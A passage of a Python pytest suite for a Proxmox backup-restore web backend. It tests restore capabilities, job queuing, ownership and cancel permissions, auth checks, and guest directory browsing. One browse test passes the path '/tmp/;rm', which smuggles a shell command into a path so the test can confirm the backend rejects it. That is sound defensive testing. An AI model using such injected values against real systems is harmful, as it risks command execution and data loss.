    assert 'data-filepath="' in body


def test_restore_capabilities_rejects_unknown_guest_type(client):
    resp = client.get("/api/restore-capabilities", params={"type": "bogus", "vmid": "133"})
    assert resp.status_code == 400


def test_restore_capabilities_returns_capability_json(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        assert guest_type == "vm"
        assert vmid == "133"
        return guest_agent.RestoreCapabilities(
            agent_running=True,
            pve_version_ok=True,
            guest_os_family="linux",
            design_a=guest_agent.PathAvailability(True),
            design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
            verify_supported=False,
        )

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["agent_running"] is True
    assert body["design_a"] == {"available": True, "reason": None}
    assert body["design_b"]["available"] is False
    assert "Unrestricted" in body["design_b"]["reason"]


def test_restore_capabilities_degrades_on_pve_error_instead_of_500(client, monkeypatch):
    from backend import guest_agent

    async def boom(session, guest_type, vmid):
        raise httpx.HTTPStatusError(
            "x",
            request=httpx.Request("GET", "http://x"),
            response=httpx.Response(403, request=httpx.Request("GET", "http://x")),
        )

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", boom)
    resp = client.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["design_a"]["available"] is False
    assert body["design_b"]["available"] is False
    assert "VM.Audit" in body["design_a"]["reason"]  # 403 -> a permissions hint


def test_restore_capabilities_degrades_on_connect_error(client, monkeypatch):
    from backend import guest_agent

    async def unreachable(session, guest_type, vmid):
        raise httpx.ConnectError("nope", request=httpx.Request("GET", "http://x"))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", unreachable)
    resp = client.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"})
    assert resp.status_code == 200
    assert "reach PVE" in resp.json()["design_a"]["reason"]


def _available_caps(**overrides):
    from backend import guest_agent

    defaults = dict(
        agent_running=True,
        pve_version_ok=True,
        guest_os_family="windows",
        design_a=guest_agent.PathAvailability(True),
        design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted privilege"),
        verify_supported=False,
    )
    defaults.update(overrides)
    return guest_agent.RestoreCapabilities(**defaults)


def _restore_form(**overrides):
    defaults = dict(
        volume="pbs:backup/vm/133/2026-08-30T14:48:06Z",
        filepath="L2V0Yy9ob3N0cw==",
        name="hosts",
        guest_type="vm",
        vmid="133",
        guest_label="web (133)",
        snapshot_time="2026-08-30T14:48:06Z",
        dest_dir="C:\\Windows\\Temp",
        overwrite="true",
    )
    defaults.update(overrides)
    return defaults


def test_restore_submits_a_queued_job(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        # submit() launches this as a real asyncio task in the running
        # TestClient event loop - keep it inert so the test only asserts
        # on the synchronous "job was queued" response, not job completion.
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    resp = client.post("/api/restore", data=_restore_form())
    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "queued"
    assert body["destination"] == "C:\\Windows\\Temp\\hosts"
    assert restore_jobs.manager.get(body["id"]) is not None


def test_restore_rejects_unknown_guest_type(client):
    resp = client.post("/api/restore", data=_restore_form(guest_type="bogus"))
    assert resp.status_code == 400


def test_restore_requires_explicit_overwrite_confirmation(client):
    resp = client.post("/api/restore", data=_restore_form(overwrite="false"))
    assert resp.status_code == 400


def test_restore_blocked_when_capability_unavailable(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_a=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.post("/api/restore", data=_restore_form())
    assert resp.status_code == 403
    assert "FileWrite" in resp.json()["detail"]


def test_restore_requires_either_filepath_name_or_item(client):
    resp = client.post("/api/restore", data=_restore_form(filepath=None, name=None))
    assert resp.status_code == 400
    assert "required" in resp.json()["detail"]


def test_restore_rejects_both_filepath_name_and_item_together(client):
    form = _restore_form()
    form["item"] = ['{"filepath": "abc==", "name": "etc", "leaf": false}']
    resp = client.post("/api/restore", data=form)
    assert resp.status_code == 400
    assert "not both" in resp.json()["detail"]


def test_restore_bundle_submits_a_queued_job(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    form = _restore_form(filepath=None, name=None, dest_dir="/home/user/restore")
    form["item"] = [
        '{"filepath": "L2V0Yw==", "name": "etc", "leaf": false}',
        '{"filepath": "L2hvbWUvZmlsZQ==", "name": "file", "leaf": true}',
    ]
    resp = client.post("/api/restore", data=form)

    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "queued"
    assert body["destination"] == "/home/user/restore"  # no filename appended - it's a bundle target dir
    assert body["source"] == "2 item(s)"

    job = restore_jobs.manager.get(body["id"])
    assert job is not None
    assert len(job.items) == 2
    assert job.items[0].name == "etc"
    assert job.items[0].leaf is False
    assert job.items[1].leaf is True


def test_restore_bundle_passes_ownership_through_for_a_linux_guest(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(guest_os_family="linux", design_b=guest_agent.PathAvailability(True))

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    form = _restore_form(filepath=None, name=None, dest_dir="/home/user/restore", restore_ownership="true")
    form["item"] = ['{"filepath": "L2V0Yw==", "name": "etc", "leaf": false}']
    resp = client.post("/api/restore", data=form)

    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.restore_ownership is True


def test_restore_bundle_ownership_forced_false_for_a_windows_guest(client, monkeypatch):
    """Issue #26: same defense-in-depth as the single-file case (#20) -
    the server never trusts the frontend's checkbox state alone."""
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        # guest_os_family defaults to "windows" in _available_caps()
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    form = _restore_form(filepath=None, name=None, dest_dir="C:\\restore", restore_ownership="true")
    form["item"] = ['{"filepath": "L2V0Yw==", "name": "etc", "leaf": false}']
    resp = client.post("/api/restore", data=form)

    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.restore_ownership is False


def test_restore_bundle_tolerates_extra_fields_in_item_json(client, monkeypatch):
    # Confirmed live 2026-09-01: the checkbox value each `item` entry
    # comes from (main.py's own item_json, browse()) always includes
    # `mtime` too - only relevant to the single-file restore path, but
    # still present on every multi-select entry. A strict
    # BundleItem(**spec) unpack broke on it; this must tolerate it, the
    # same way download_bundle()'s own item-parsing already does for
    # this exact JSON shape.
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    form = _restore_form(filepath=None, name=None, dest_dir="/home/user/restore")
    form["item"] = ['{"filepath": "L2V0Yw==", "name": "etc", "leaf": false, "mtime": 1700000000, "size": null}']
    resp = client.post("/api/restore", data=form)

    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.items[0].filepath == "L2V0Yw=="
    assert job.items[0].name == "etc"
    assert job.items[0].leaf is False


def test_restore_bundle_checks_design_b_not_design_a(client, monkeypatch):
    # A bundle restore always needs guest-exec - design_a availability
    # (the single-call fast path) is irrelevant to it.
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(
            design_a=guest_agent.PathAvailability(False, "missing VM.GuestAgent.FileWrite"),
            design_b=guest_agent.PathAvailability(True),
        )

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    form = _restore_form(filepath=None, name=None)
    form["item"] = ['{"filepath": "abc==", "name": "f", "leaf": true}']

    from backend import restore_jobs, restore_runner

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    resp = client.post("/api/restore", data=form)
    assert resp.status_code == 200  # design_a being unavailable doesn't block a bundle restore
    assert restore_jobs.manager.get(resp.json()["id"]) is not None


def test_restore_bundle_blocked_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(False, "missing VM.GuestAgent.Unrestricted"))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    form = _restore_form(filepath=None, name=None)
    form["item"] = ['{"filepath": "abc==", "name": "f", "leaf": true}']
    resp = client.post("/api/restore", data=form)
    assert resp.status_code == 403
    assert "Unrestricted" in resp.json()["detail"]


def test_restore_bundle_rejects_invalid_item_json(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    form = _restore_form(filepath=None, name=None)
    form["item"] = ["not json"]
    resp = client.post("/api/restore", data=form)
    assert resp.status_code == 400


def test_restore_uses_posix_separator_for_non_windows_guest(client, monkeypatch):
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(guest_os_family="linux")

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    resp = client.post("/api/restore", data=_restore_form(dest_dir="/etc", name="hosts"))
    assert resp.status_code == 200
    assert resp.json()["destination"] == "/etc/hosts"


def test_restore_blocked_when_metadata_requested_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        # design_a available, design_b not - only FileWrite, no Unrestricted
        return _available_caps(design_a=guest_agent.PathAvailability(True))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.post("/api/restore", data=_restore_form(restore_metadata="true"))
    assert resp.status_code == 403
    assert "Unrestricted" in resp.json()["detail"]


def test_restore_blocked_when_verify_requested_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_a=guest_agent.PathAvailability(True))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.post("/api/restore", data=_restore_form(verify="true"))
    assert resp.status_code == 403


def test_restore_passes_metadata_verify_and_mtime_through_to_the_job(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(
            design_a=guest_agent.PathAvailability(True), design_b=guest_agent.PathAvailability(True)
        )

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    resp = client.post(
        "/api/restore", data=_restore_form(restore_metadata="true", verify="true", source_mtime="1700000000")
    )
    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.restore_metadata is True
    assert job.verify is True
    assert job.source_mtime == 1700000000


def test_restore_blocked_when_ownership_requested_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_a=guest_agent.PathAvailability(True))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.post("/api/restore", data=_restore_form(restore_ownership="true"))
    assert resp.status_code == 403


def test_restore_passes_ownership_through_to_the_job_for_a_linux_guest(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(
            guest_os_family="linux",
            design_a=guest_agent.PathAvailability(True),
            design_b=guest_agent.PathAvailability(True),
        )

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    resp = client.post("/api/restore", data=_restore_form(restore_ownership="true"))
    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.restore_ownership is True


def test_restore_ownership_forced_false_for_a_windows_guest_regardless_of_request(client, monkeypatch):
    """Issue #20: NTFS has no uid/gid/mode concept, and ACL restore is a
    separate, confirmed-infeasible-via-this-API problem - the server
    never trusts the frontend's checkbox state for this, even though
    the checkbox is also disabled client-side for a Windows guest."""
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        # guest_os_family defaults to "windows" in _available_caps()
        return _available_caps(
            design_a=guest_agent.PathAvailability(True), design_b=guest_agent.PathAvailability(True)
        )

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)

    resp = client.post("/api/restore", data=_restore_form(restore_ownership="true"))
    assert resp.status_code == 200
    job = restore_jobs.manager.get(resp.json()["id"])
    assert job.restore_ownership is False


def test_restore_requires_auth():
    with TestClient(main.app) as c:
        resp = c.post("/api/restore", data=_restore_form(), follow_redirects=False)
    assert resp.status_code in (302, 401)


def test_restore_jobs_list_returns_submitted_job(client, monkeypatch):
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    resp = client.get("/api/restore-jobs")
    assert resp.status_code == 200
    body = resp.json()
    jobs = body["jobs"]
    assert any(j["id"] == submitted["id"] for j in jobs)
    assert any(j["requested_by"] == submitted["requested_by"] for j in jobs)


def test_restore_jobs_list_empty_when_none_submitted(client):
    resp = client.get("/api/restore-jobs")
    assert resp.status_code == 200
    body = resp.json()
    assert body["jobs"] == []
    # Default RESTRICT_JOBS_TO_OWN is off - unrestricted/unchanged behavior.
    assert body["scope"] == "all"
    assert body["can_see_all"] is True


def _persist_historical_job(session_data, **overrides):
    """Simulates a job left behind by a previous process - written
    straight to job_history via a throwaway manager, never wired into
    main.app's own in-memory restore_jobs.manager."""
    from backend.restore_jobs import RestoreJobManager

    throwaway = RestoreJobManager()
    defaults = dict(
        session=session_data,
        guest_type="vm",
        vmid="133",
        guest_label="web (133)",
        task_name="Restore 2026-08-30 14:48 -> /etc",
        snapshot_time="2026-08-30T14:48:06Z",
        source_volume="pbs:backup/vm/133/2026-08-30T14:48:06Z",
        source_filepath="L2V0Yy9ob3N0cw==",
        source="/etc/hosts",
        destination="/etc",
    )
    defaults.update(overrides)
    return throwaway.create(**defaults)


def test_restore_jobs_list_includes_persisted_jobs_from_a_previous_process(client, session_data):
    import time

    from backend.restore_jobs import RestoreStatus

    job = _persist_historical_job(session_data)
    job.status = RestoreStatus.DONE
    job.finished_at = time.time()
    job_history.persist_sync(job)

    resp = client.get("/api/restore-jobs")
    body = resp.json()
    entry = next((j for j in body["jobs"] if j["id"] == job.id), None)
    assert entry is not None
    assert entry["status"] == "done"
    assert entry["can_cancel"] is False
    assert "log" not in entry


def test_restore_jobs_list_live_job_takes_precedence_over_its_own_persisted_row(client, monkeypatch):
    """A job still tracked by this process's in-memory manager must not
    also show up a second time via its own (now-stale) persisted row."""
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    resp = client.get("/api/restore-jobs")
    body = resp.json()
    matches = [j for j in body["jobs"] if j["id"] == submitted["id"]]
    assert len(matches) == 1


def test_restore_jobs_list_omits_persisted_jobs_past_retention(client, monkeypatch, session_data):
    import time

    from backend.restore_jobs import RestoreStatus

    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, job_history_retention_days=7))
    job = _persist_historical_job(session_data)
    job.status = RestoreStatus.DONE
    job.finished_at = time.time() - (8 * 86400)
    job_history.persist_sync(job)

    resp = client.get("/api/restore-jobs")
    body = resp.json()
    assert all(j["id"] != job.id for j in body["jobs"])


def test_restore_jobs_detail_falls_back_to_persisted_history(client, session_data):
    from backend.restore_jobs import RestoreStatus

    job = _persist_historical_job(session_data)
    job.status = RestoreStatus.DONE
    job.log("ran to completion")
    job_history.persist_sync(job)

    resp = client.get(f"/api/restore-jobs/{job.id}")
    assert resp.status_code == 200
    body = resp.json()
    assert any("ran to completion" in line for line in body["log"])


def test_restore_jobs_detail_404s_when_not_live_or_persisted(client):
    resp = client.get("/api/restore-jobs/does-not-exist-anywhere")
    assert resp.status_code == 404


def test_restore_jobs_list_defaults_to_mine_when_restricted(client, monkeypatch):
    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
    resp = client.get("/api/restore-jobs")
    assert resp.status_code == 200
    body = resp.json()
    assert body["scope"] == "mine"
    assert body["can_see_all"] is False


def test_restore_jobs_list_restricted_non_admin_cannot_request_all(client, monkeypatch):
    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
    resp = client.get("/api/restore-jobs", params={"scope": "all"})
    assert resp.status_code == 200
    body = resp.json()
    # Clamped back to "mine" - a restricted, non-admin session can't opt out server-side.
    assert body["scope"] == "mine"
    assert body["can_see_all"] is False


def test_restore_jobs_list_restricted_admin_can_request_all(client, monkeypatch, session_data):
    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
    session_data.cap = {"dc": {"Sys.Audit": 1}}
    resp = client.get("/api/restore-jobs", params={"scope": "all"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["scope"] == "all"
    assert body["can_see_all"] is True


def test_restore_jobs_list_restricted_filters_to_own_jobs(client, monkeypatch):
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, restrict_jobs_to_own=True))
    resp = client.get("/api/restore-jobs")
    assert resp.status_code == 200
    body = resp.json()
    assert all(j["requested_by"] == submitted["requested_by"] for j in body["jobs"])
    assert any(j["id"] == submitted["id"] for j in body["jobs"])


def test_restore_jobs_list_requires_auth():
    with TestClient(main.app) as c:
        resp = c.get("/api/restore-jobs", follow_redirects=False)
    assert resp.status_code in (302, 401)


def test_restore_jobs_cancel_unknown_job_404s(client):
    resp = client.post("/api/restore-jobs/does-not-exist/cancel")
    assert resp.status_code == 404


def test_restore_jobs_detail_returns_log(client, monkeypatch):
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    # Mutate the job directly rather than relying on the (monkeypatched,
    # inert) background task's own scheduling timing.
    job = restore_jobs.manager.get(submitted["id"])
    job.log("did a thing")

    resp = client.get(f"/api/restore-jobs/{submitted['id']}")
    assert resp.status_code == 200
    body = resp.json()
    assert any("did a thing" in line for line in body["log"])
    assert body["id"] == submitted["id"]

    # The list endpoint's dict shape stays lean - no log field.
    assert "log" not in job.to_dict()


def test_restore_jobs_detail_unknown_job_404s(client):
    resp = client.get("/api/restore-jobs/does-not-exist")
    assert resp.status_code == 404


def test_restore_jobs_detail_requires_auth():
    with TestClient(main.app) as c:
        resp = c.get("/api/restore-jobs/x", follow_redirects=False)
    assert resp.status_code in (302, 401)


def test_restore_jobs_cancel_marks_flag_and_returns_job(client, monkeypatch):
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def hangs(job, jobs):
        await asyncio.sleep(3600)

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", hangs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    resp = client.post(f"/api/restore-jobs/{submitted['id']}/cancel")
    assert resp.status_code == 200
    assert resp.json()["id"] == submitted["id"]


def test_restore_jobs_cancel_forbidden_for_non_owner_non_admin(client, monkeypatch, session_data):
    """Issue #123: cancel has its own ownership check, independent of
    RESTRICT_JOBS_TO_OWN (#122) - a job submitted by one user can't be
    cancelled by another who isn't a job admin either."""
    from backend import guest_agent, restore_jobs, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def hangs(job, jobs):
        await asyncio.sleep(3600)

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", hangs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    other = dataclasses.replace(session_data, username="mallory@pam", cap={})
    main.app.dependency_overrides[auth.get_session] = lambda: other
    try:
        resp = client.post(f"/api/restore-jobs/{submitted['id']}/cancel")
    finally:
        main.app.dependency_overrides[auth.get_session] = lambda: session_data
    assert resp.status_code == 403

    job = restore_jobs.manager.get(submitted["id"])
    assert job.status != restore_jobs.RestoreStatus.CANCELLED


def test_restore_jobs_cancel_allowed_for_job_admin(client, monkeypatch, session_data):
    """A non-owner who holds the configured bypass privilege (cap["dc"])
    can still cancel someone else's job."""
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def hangs(job, jobs):
        await asyncio.sleep(3600)

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", hangs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    admin = dataclasses.replace(session_data, username="admin@pam", cap={"dc": {"Sys.Audit": 1}})
    main.app.dependency_overrides[auth.get_session] = lambda: admin
    try:
        resp = client.post(f"/api/restore-jobs/{submitted['id']}/cancel")
    finally:
        main.app.dependency_overrides[auth.get_session] = lambda: session_data
    assert resp.status_code == 200


def test_restore_jobs_list_can_cancel_reflects_ownership(client, monkeypatch, session_data):
    from backend import guest_agent, restore_runner

    async def fake_caps(session, guest_type, vmid):
        return _available_caps()

    async def never_runs(job, jobs):
        pass

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(restore_runner, "run_restore", never_runs)
    submitted = client.post("/api/restore", data=_restore_form()).json()

    resp = client.get("/api/restore-jobs")
    jobs = {j["id"]: j for j in resp.json()["jobs"]}
    assert jobs[submitted["id"]]["can_cancel"] is True

    other = dataclasses.replace(session_data, username="mallory@pam", cap={})
    main.app.dependency_overrides[auth.get_session_keepalive] = lambda: other
    try:
        resp = client.get("/api/restore-jobs")
    finally:
        main.app.dependency_overrides[auth.get_session_keepalive] = lambda: session_data
    jobs = {j["id"]: j for j in resp.json()["jobs"]}
    assert jobs[submitted["id"]]["can_cancel"] is False


def test_restore_jobs_cancel_requires_auth():
    with TestClient(main.app) as c:
        resp = c.post("/api/restore-jobs/x/cancel", follow_redirects=False)
    assert resp.status_code in (302, 401)


async def test_startup_reconciles_jobs_left_active_by_a_previous_process(session_data):
    """A new TestClient entering triggers main.py's lifespan startup
    hook, which must reconcile a still-active row to interrupted."""
    job = _persist_historical_job(session_data)  # left "queued" - never transitioned
    assert job.is_active

    with TestClient(main.app):
        pass  # lifespan startup/shutdown is all this test needs to trigger

    detail = await job_history.get(job.id)
    assert detail["status"] == "interrupted"


def test_restore_capabilities_requires_auth():
    with TestClient(main.app) as c:
        resp = c.get("/api/restore-capabilities", params={"type": "vm", "vmid": "133"}, follow_redirects=False)
    assert resp.status_code in (302, 401)


def test_restore_browse_rejects_unknown_guest_type(client):
    resp = client.get("/api/restore-browse", params={"type": "bogus", "vmid": "133"})
    assert resp.status_code == 400


def test_restore_browse_blocked_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        reason = "missing VM.GuestAgent.Unrestricted privilege"
        return _available_caps(design_b=guest_agent.PathAvailability(False, reason))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.get("/api/restore-browse", params={"type": "vm", "vmid": "133"})
    assert resp.status_code == 403
    assert "Unrestricted" in resp.json()["detail"]


def test_restore_browse_returns_listing(client, monkeypatch):
    from backend import guest_agent, guest_browse

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True), guest_os_family="linux")

    async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
        assert guest_os_family == "linux"
        assert path == "/etc"
        return {"path": "/etc", "parent": "/", "separator": "/", "entries": [{"name": "nginx", "path": "/etc/nginx"}]}

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_browse, "list_directories", fake_list)
    resp = client.get("/api/restore-browse", params={"type": "vm", "vmid": "133", "path": "/etc"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["entries"] == [{"name": "nginx", "path": "/etc/nginx"}]


def test_restore_browse_unsafe_path_returns_400(client, monkeypatch):
    from backend import guest_agent, guest_browse

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
        raise guest_browse.UnsafePathError("nope")

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_browse, "list_directories", fake_list)
    resp = client.get("/api/restore-browse", params={"type": "vm", "vmid": "133", "path": "/tmp/;rm"})
    assert resp.status_code == 400


def test_restore_browse_listing_error_returns_502(client, monkeypatch):
    from backend import guest_agent, guest_browse

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def fake_list(session, guest_type, vmid, guest_os_family, path, **kwargs):
        raise guest_browse.ListingError("No such file or directory")

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_browse, "list_directories", fake_list)
    resp = client.get("/api/restore-browse", params={"type": "vm", "vmid": "133"})
    assert resp.status_code == 502


def test_restore_original_path_rejects_unknown_guest_type(client):
    resp = client.get("/api/restore-original-path", params={"type": "bogus", "vmid": "133", "volume": "vol"})
    assert resp.status_code == 400


def test_restore_original_path_rejects_containers(client):
    """Issue #68: push-to-guest restore is never available for a
    container at all (no qemu-guest-agent) - this whole modal, and so
    this endpoint, is unreachable for one; 400 rather than a 200
    available=false so a stray call doesn't look like a real answer."""
    resp = client.get("/api/restore-original-path", params={"type": "ct", "vmid": "133", "volume": "vol"})
    assert resp.status_code == 400
    assert "container" in resp.json()["detail"].lower()


def test_restore_original_path_blocked_without_design_b(client, monkeypatch):
    from backend import guest_agent

    async def fake_caps(session, guest_type, vmid):
        reason = "missing VM.GuestAgent.Unrestricted privilege"
        return _available_caps(design_b=guest_agent.PathAvailability(False, reason))

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    resp = client.get("/api/restore-original-path", params={"type": "vm", "vmid": "133", "volume": "vol"})
    assert resp.status_code == 403
    assert "Unrestricted" in resp.json()["detail"]


def test_restore_original_path_returns_resolved_directory(client, monkeypatch):
    from backend import guest_agent, guest_original_location

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True), guest_os_family="linux", node="pve2")

    async def fake_resolve(session, vmid, guest_os_family, node, volume, crumbs):
        assert guest_os_family == "linux"
        assert node == "pve2"
        assert volume == "vol"
        assert crumbs == [{"label": "Root", "filepath": "/"}]
        return guest_original_location.OriginalLocationResult(available=True, directory="/home/alice")

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_original_location, "resolve_original_directory", fake_resolve)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}])
    resp = client.get(
        "/api/restore-original-path",
        params={"type": "vm", "vmid": "133", "volume": "vol", "crumbs": crumbs},
    )
    assert resp.status_code == 200
    assert resp.json() == {"available": True, "directory": "/home/alice", "reason": None}


def test_restore_original_path_surfaces_unavailable_reason(client, monkeypatch):
    from backend import guest_agent, guest_original_location

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def fake_resolve(session, vmid, guest_os_family, node, volume, crumbs):
        return guest_original_location.OriginalLocationResult(available=False, reason="not mounted")

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_original_location, "resolve_original_directory", fake_resolve)
    resp = client.get("/api/restore-original-path", params={"type": "vm", "vmid": "133", "volume": "vol"})
    assert resp.status_code == 200
    assert resp.json() == {"available": False, "directory": None, "reason": "not mounted"}


def test_restore_original_path_requires_auth():
